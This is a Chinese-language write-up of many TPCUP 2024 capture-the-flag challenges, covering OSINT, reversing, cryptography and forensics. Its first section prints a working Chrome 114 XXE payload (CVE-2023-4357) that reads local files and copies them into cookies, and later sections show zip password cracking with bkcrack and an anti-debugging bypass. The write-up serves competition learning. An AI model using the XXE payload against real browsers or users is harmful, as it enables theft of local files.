# TPCUP 2024

## X…什么？

看到 chrome-114.0.5735.90 搜索下这个版本可以找到 CVE-2023-4357 漏洞复现，使用 [xcanwin/CVE-2023-4357-Chrome-XXE](https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE) 的单文件 EXP，改成读取 flag，然后加上写入 cookies 的代码。

由于同时要有 svg 和 xml 解析，所以 Content-Type 设为 `image/svg+xml`，可以自己搭建本地环境看看

```xml
<!-- d.svg -->
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="?#"?>
<!DOCTYPE div [
<!ENTITY passwd_p "file:///flag">
<!ENTITY passwd_c SYSTEM "file:///flag">
]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/">
    <xsl:copy-of select="document('')"/>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <div style="display:none">
        <p class="&passwd_p;">&passwd_c;</p>
      </div>
      <div style="width:40rem" id="r"/>
      <script>
        document.querySelectorAll('p').forEach(p =&gt; {
          document.cookie=p.innerHTML;
        });
      </script>
    </body>
  </xsl:template>
</xsl:stylesheet>
```

上传后访问 `/d.svg` 即可

`flag{XXE_is_alSo_y0ur_g0oD_fR13Nd}`

> 没修前已经能读 `/etc/passwd` 了，但读 `/flag` 没结果。以为是没权限需要提权，结果是没放 flag（
> 话说为什么读得了 `/usr/src/app/requirements.txt` 但读不了 `xssbot.py` 呢

## Uncrackable

### 更新附件后

zip 已知明文攻击，用 `zipinfo` 查看下压缩包

```bash
❯ zipinfo prob05.zip
Archive:  prob05.zip
Zip file size: 3545476 bytes, number of entries: 2
-rw----     0.0 fat   109332 T- defN 24-Feb-13 18:53 anticheat.js
-rw----     0.0 fat  3550103 B- defN 24-Feb-13 18:53 uncrackable.m4a
2 files, 3659435 bytes uncompressed, 3545224 bytes compressed:  3.1%
```

`anticheat.js` 文件是已知的，可以从 [https://www.tpcup.org/anticheat.js](https://www.tpcup.org/anticheat.js) 下载，需要压缩后才可以用工具 (bkcrack/rbkcrack/pkcrack) 爆破密钥

这题和压缩工具关系很大，使用 `pyminizip == 0.2.6` 在 `compress_level = 0 or 6` 下可以成功，`zip = 3.0-11.1` 和 `7z = 23.01` 均失败 ~~，还是在群聊中得知的压缩工具~~

```py
# crypto.py
import os
import pyminizip
for i in range(10):
    print(f"level:{i}")
    pyminizip.compress("anticheat.js", None, "anticheat.zip", None, i)
    # os.system("zip -%d anticheat.zip anticheat.js > /dev/null" % (i))
    # os.system("7z a -tzip -mx%d anticheat.zip anticheat.js > /dev/null" % (i))
    os.system("bkcrack -C prob05.zip -c anticheat.js -P anticheat.zip -p anticheat.js")
```

```bash
❯ python crypto.py
level:0
bkcrack 1.6.1 - 2024-01-22
[21:59:49] Z reduction using 44370 bytes of known plaintext
26.0 % (11536 / 44370)
[21:59:50] Attack on 155 Z values at index 33459
Keys: d0043c88 20e5781d 2160b96d
94.8 % (147 / 155)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 147
[21:59:50] Keys
d0043c88 20e5781d 2160b96d
```

用密钥获取压缩包密码

```bash
❯ bkcrack -C prob05.zip -c uncrackable.m4a -k d0043c88 20e5781d 2160b96d -b \?a -l 12
bkcrack 1.6.1 - 2024-01-22
[22:42:55] Recovering password
length 12...
Password: bQCvRH7q1ULs
60.4 % (2321 / 3844)
Found a solution. Stopping.
You may resume the password recovery with the option: --continue-recovery 625151303030
[22:42:59] Password
as bytes: 62 51 43 76 52 48 37 71 31 55 4c 73
as text: bQCvRH7q1ULs
```

用密码解压之后查看 uncrackable.m4a 末尾的附加字符 `strings uncrackable.m4a | grep flag`

`flag{z1p_IsN7_5ucH_S4f3}`

### 下面是之前的附件的错误解法

之前的附件，给出提示部分 M4A 头字节(摩斯密码，五位一组) `7479706d7000000` 补个 0 就有 8 位，我以为是这个是压缩后的，猜测前三位是 `000000`

```bash
❯ bkcrack -C prob05.zip -c 70.m4a -p 70.txt -o 5 -x 0 000000
bkcrack 1.6.1 - 2024-01-22
[00:47:57] Attack on 4194304 Z values at index 12
Keys: 5bb795f4 424af6b2 acadf670
43.6 % (1828975 / 4194304)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 1828975
[01:02:46] Keys
5bb795f4 424af6b2 acadf670
```

可以爆出密钥（但是是错误的），所以最后解密压缩包的时候提示文件损坏 `zlib.error: Error -3 while decompressing data: invalid stored block lengths` 可惜

### 下面可能是正确的解法

zip 明文攻击至少需要 12 位字符，其中 8 位要连续
这个压缩包的 `compress_level == 5`，提示的是 M4A 头，但不是连续的。第 0-2 位是 `000000`，搜索文件头可以查到第 3 位一般是 `20`，但我生成了一个文件第 3 位是 `1C`。。。
第 4-9 位是 `667479706070` 就是提示的，但现在只有 10 位，还需要两位。可以随机抓后面的空白部分来补充位数，之后就可能可以正常爆破密钥了（没爆出来

```bash
❯ python crypto.py
level:5
bkcrack 1.6.1 - 2024-01-22
[22:16:14] Z reduction using 1048569 bytes of known plaintext
0.8 % (8070 / 1048569)
[22:16:15] Attack on 130 Z values at index 1041024
Keys: a08fc77f 1dd36012 734e2126
76.2 % (99 / 130)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 99
[22:16:15] Keys
a08fc77f 1dd36012 734e2126
```

压缩包密码是：`D0mbgaf6OhNp` 解密即可

> uncrackable.m4a 是周深的 Unstoppable （挺配的

## 非常好忽悠混合

flag1 找个哔站视频下载的解析下原始标题得到（在去年的时候就知道了
flag2 在视频的第二帧出现（一眼

`flag{h0W_d0_y0U_kN0w_mY_V1d3O_n4M3}`
`flag{f1Nd_7H3_f14g_iN_Th3_S3c0nD_fr4m3}`

## 心中无码，自然高清

这题是连蒙带猜的，基本思路就是遍历字符生成马赛克，看和密文是否一致（或误差很小）
到下划线要更改 44/45 行，为 `ll = len(flag) - 1` 调整枚举中间位置，如果为空可以跳过，这样能得到 `flag{lag{ev3R tH1` 如果没有结果可以把 50 行取消注释，输出差别较小的字母，再猜下能还原 flag

```py
from PIL import Image, ImageDraw, ImageFont, ImageChops
k = 0
flag = r'flag{'
while k < 255:
    k += 1
    flag += chr(k)

    H = 68
    W = 34

    canvas = Image.new('RGB', (W * len(flag), H), (255, 255, 255))
    font = ImageFont.truetype(
        './JetBrainsMono-Regular.ttf', 56, encoding='utf-8')
    pen = ImageDraw.Draw(canvas)
    pen.text((0, 0), flag, 'black', font)

    canvas.save('flag_uncensored.png', format='png')

    for i in range(len(flag)):
        char = canvas.crop((W * i, 0, W * (i + 1), H))
        char.save(f'./tmp_char/char_{i}.png')

    def mosaic_img(img: Image.Image, L, H, R, D):
        w, h = R - L, D - H
        a = [0, 0, 0]
        cnt = 0
        for x in range(w):
            for y in range(h):
                j = img.getpixel((L + x, H + y))
                for ch in range(len(a)):
                    a[ch] += j[ch]
                cnt += 1
        b = [k // cnt for k in a]
        mosaic = Image.new('RGB', (w, h), tuple(b))
        img.paste(mosaic, (L, H, R, D))

    for i in range(5, len(flag)):
        mosaic_img(canvas, W * i, 0, W * i + W, H // 2)
        mosaic_img(canvas, W * i, H // 2, W * i + W, H)

    canvas.save('flag_censored.png', format='png')
    f = Image.open('./70.png')
    censored = Image.open('./flag_censored.png')
    ll = len(flag)
    # ll = len(flag) - 1
    cropped_region = f.crop((W * (ll - 1), 0, W * ll, H // 2))
    censored_cropped = censored.crop((W * (ll - 1), 0, W * ll, H // 2))
    diff = ImageChops.difference(censored_cropped, cropped_region)
    if diff.getextrema()[0][0] == 0 and diff.getextrema()[1][0] == 0 and diff.getextrema()[2][0] == 0:
        # print("not best", chr(k), diff.getextrema())
        cropped_region = f.crop((W * (ll - 1), H // 2, W * ll, H))
        censored_cropped = censored.crop((W * (ll - 1), H // 2, W * ll, H))
        diff = ImageChops.difference(censored_cropped, cropped_region)
        if diff.getextrema()[0][0] == 0 and diff.getextrema()[1][0] == 0 and diff.getextrema()[2][0] == 0:
            print(chr(k), diff.getextrema())
    flag = flag[:-1]
```

`flag{ev3RytH1ng_1s_Cl3Ar}`

## 躺平问答

> 上周，身为2024届英才计划培养对象的出题人ZianTT参加了一次冬令营，请问他的活动大致地点是？（七个汉字）

不会有人不止到 HIT 吧（

> 在2023年，Cloudflare因为机房停电导致大量服务不可用，Cloudflare官方博客记载此时的英文版链接是：

如何干翻 CloudFlare？给它的数据中心拉闸（，在 cf 的 blog 可以找到 （或者直接搜

> QQ上线了新春活动，但糟糕的体验显然引发了一些用户的困扰，关闭该功能的链接是？（一个由https://开始的链接）

这是最后才出的题，本来以为要前几年的关闭入口，结果填今年的表单就行，在 QA 群里可以找到

```txt
提示
QQ 春节活动关闭登记表
https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB
设置 - 关于 QQ 与帮助 - 反馈 - 「如何关闭春节红包活动」
2024-02-06
15.6K viewsedited  
12:29
```

> HTCPCP是一种类似HTTP的协议，用于控制咖啡壶，其中，当发送了BREW请求来冲泡的时候，如果服务认为请求的添加项组合违背了饮酒者对所述种类的共识，返回的状态码是：

懒得看就把文档的状态码都试下

> OpenAI在2024年1月发生了多少运行事件(以公示数据为准 )：

goto [https://status.openai.com/history](https://status.openai.com/history) 数下一月份的数据

> 比赛平台域名tpcup.org的Registry Domain ID 是：

在 [https://lookup.icann.org/en/lookup](https://lookup.icann.org/en/lookup) 查到

> 本次比赛计算服务提供商所在主体纳税人识别号是：（18位由数字和大写字母组成的字符串）

赞助商是晞云，在官网给出了公司名，搜索一下纳税人识别号就行

```json
{
    "token":"",
    "ans_1":"哈尔滨工业大学",
    "ans_2":"https://blog.cloudflare.com/post-mortem-on-cloudflare-control-plane-and-analytics-outage",
    "ans_3":"https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB",
    "ans_4":"403",
    "ans_5":"11",
    "ans_6":"6de68c6722e84ac0a541745e94b7dca0-LROR",
    "ans_7":"91440403MACK9P7J40"
}
```

~~XX，一道都做不出来，重开吧~~
`全做出来了！这是flag1flag{I_L0v3_tP4sK}这是flag2flag{very_go0d_questOnS}`

> 中英文没空格差评

## 躺平论坛

### flag1

F12 Find flag1

`flag{we1cc0m3_t0_taN6P4ng_f0Rum}`

### flag2

flag2 要找到有 flag 的 discussion，但说不能批量尝试（
看了下 flarum 的查询接口，默认一次 20 条有点慢，总共 1048 条要试 53 。但猜测它有 limit 参数可以控制数量，测试发现一次最多 50 条，只要发 21 次就能找到了
连接： [/api/discussions?page[offset]=450&page[limit]=50](https://forum.tpcup.org/api/discussions?page[offset]=450&page[limit]=50)

看到 flag 才知道预期解是看 sitemap
可以从 [/sitemap.xml](https://forum.tpcup.org/sitemap.xml) 到 [/sitemap-live/1](https://forum.tpcup.org/sitemap-live/1) 到 [/d/566-flag](https://forum.tpcup.org/d/566-flag) 找到 flag

`flag{1_C5n_F1n5_f14G_Fr0m_s1t3m4p}`

## HIT! 准入认证!

### flag1

flag1 查看字符串

`flag{ZI4n7T_a7T3nd_ycjH_w1nt3r_c4mP_1n_h1t}`

### flag2

分析 sub_1165 函数

```c
__int64 __fastcall sub_1165(__int64 a1, char a2, __int64 a3, __int64 a4, int a5)
{
  __int64 result; // rax
  unsigned int i; // [rsp+2Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( (int)i >= a5 )
      break;
    *(_BYTE *)((int)i + a4) = a2 * *(_BYTE *)((int)i + a1) + *(_BYTE *)((int)i + a3);
  }
  return result;
}
```

把 a1 字符每一位乘以 233 加上 a3 数组对应位的值模 256。sub_125E 函数是 base64 换表编码。

base64 码表：`asdfghjklqwertyuiopzxcvbnmQWERTYUIOPZXCVBNMASDFGHJKL$%^)!@#&*(-?`

base64 密文：`%%xv$v^DlcLAHnMaxNF^ndmEOVr^r^?v-AJoOJczCo$.`

a3 数组对应的是 unk_4060，可以直接从跟踪中获取

```py
a3 = [0x1, 0x9, 0xcd, 0x12, 0x7a, 0x9e, 0x79, 0xf1, 0x74, 0x19, 0x19, 0xc, 0xdb, 0x6f, 0x25, 0x14, 0xdd, 0x61, 0x13, 0xe2, 0x8b, 0xbc, 0xc4, 0x26, 0x83, 0xbe, 0xb8, 0x70, 0xaa, 0x4a, 0x90, 0x58]
a1= [0xd7, 0x55, 0x16, 0xd1, 0x6d, 0xad, 0x21, 0x5c, 0xeb, 0xc1, 0x8a, 0x80, 0x52, 0x9b, 0xb6, 0x60, 0x26, 0x5c, 0x8a, 0x73, 0x36, 0x33, 0x6f, 0xd6, 0xfa, 0xbc, 0x51, 0x8b, 0x15, 0x53, 0x99, 0x1d]
for i in range(len(a1)):
    for j in range(256):
        if (j * 233 + a3[i]) % 256 == a1[i]:
            print(chr(j), end="")
```

`flag{7h3_hIT_LilaC_is_s0_N1c3!!}`

## bepbep

### flag1

morse2ascii 你值得拥有

```bash
❯ morse2ascii morse.wav

MORSE2ASCII 0.2.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- open morse.wav
wave size      597040
format tag     1
channels:      1
samples/sec:   8000
avg/bytes/sec: 8000
block align:   1
bits:          8
samples:       597040
bias adjust:   0
volume peaks:  -31744 31744
normalize:     1023

- decoded morse data:
flag  g3t  f14g  fr0m  mor3ecad3  add  underline  between  each  word  go  to  https:://storage..wearos..fans//amarket//name..wav  (all  lowercase))
```

`flag{g3t_f14g_fr0m_mor3ecad3}`

### flag2

flag2 是 SSTV，用 Qsstv 接收图像

flag{SSTV_IS_VERY_INTERESTING}

> HEN HAO DE JIE MI AI LAI ZI TANG PING BEI

## 我朝，大盒

### flag1

> 问题1：图片中的位置附近有一条高速公路 请给出高速公路编号[G+两位数字]

下载照片到手机，有提供 GPS 信息，直接定位。

> 问题2：图片所在位置最近的市是哪个[XX(X)市]

同上，地图可看

> 问题3：图片采用的ISO感光度是多少

看下 exif iso

### flag2

在 [中国铁路地图 cnrail.geogv.org](http://cnrail.geogv.org/zhcn/station/41060731) 找下 漳县、陇南、广元这几个站，结合短信时间尝试

```json
{"token":"","ans1":"G75","ans2":"阆中市","ans3":"138"}
{"token":"","ans4":"D206"}
这是flag1flag{wHO0ps_woc50_he}
这是flag2flag{a1_lA1_zI_gU0_T
```

### flag3

> 答错出题人了，悲（

### flag4

【数据删除】~~(来自群聊天记录）~~

## 躺平聊天室2.0

用 jadx-gui 逆向 apk，在 com.zhizi42.tpc2024.MainActivity 找到主要逻辑

### flag1

直接查看字符串

`flag{Th1s_1s_s0_s1mp1e}`

### flag2

base64 解码 `ZmxhZ3tmbGFnYmFzZTY0fQ==`
`flag{flagbase64}`

### flag3

点开 t2 可找到
AES/ECB/PKCS5Padding 解密 `e+Fy/ONEqoJVBIXzCLZ6Kx+vjukEgXFkOaet9ti3hrc=`，密钥是 flag2
`flag{alldone!!!}`

## 主唱太拼命了

RSA 已知部分高位攻击，但教程一般给的是已知 p 高位，没有已知 p+q 高位的解法
这里 [https://github.com/7feilee/ctf_writeup/blob/master/2020/HITCTF/crypto_dgk/src/solve.sage](https://github.com/7feilee/ctf_writeup/blob/master/2020/HITCTF/crypto_dgk/src/solve.sage) 提供了

```py
p_pro = (p_add_q + int(sqrt(p_add_q * p_add_q - 4 * n))) // 2
```

稍微改了一下脚本用 sage 求解 p 和 q

```py
# sage
n = 99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393
p_add_q = 19908296297154261193603784476638931123516240704025306244561930935833463971799128110489967448460913311580547389743367260902522865073200825917723058108366848
p_pro = (p_add_q + int(sqrt(p_add_q * p_add_q - 4 * n))) // 2
F.<x> = PolynomialRing(Zmod(n), implementation = 'NTL')
poly = p_pro + x
x0 = poly.small_roots(X = 2 ** 100, beta = 0.4)
p = int(gcd(p_pro + x0[0], n))
q = n // int(p)
assert n == p * q
print(p)
print(q)
```

求得 p 和 q 后可以解密

```py
from Crypto.Util.number import long_to_bytes, bytes_to_long, inverse

c = 18440872486403323622510807012978507180529941426106643115456980837956295325764192595485820729772845428753953590301713705078399201869365193708057327848899904074671832807596665367550614919055119509073812499316019447070077472419739116237952486260179612984582496862441609849035603842161839069407115218245681423369
n = 99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393
e = bytes_to_long(b"too desperate!")
p = 10157834627517369652898607336515095650881694895149683559384292084371259269447224625631118311560267756403388223138257762142383835818056617774624176508335047
q = 9750461669636891540705177140123835472634545808875622685177638851462204702351903484858849136900645555177159166605109498760139029255144208849671942596334519
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
print(long_to_bytes(pow(c, d, n)))
```

`flag{th3_w0rld_1s_An0n_t0ky0}`

## [投稿]CrackMe

由于是静态 flag，因此只要绕过调试检测后 (在 `isDebuggerPresent`、`anti_debugger` 判断处下断点返回值改成 0)，在 `RSADecryptor` 函数部分下断点获取 v4 的值就是 flag

`flag{Xyu_h0is_z7Qs_l0VE}`
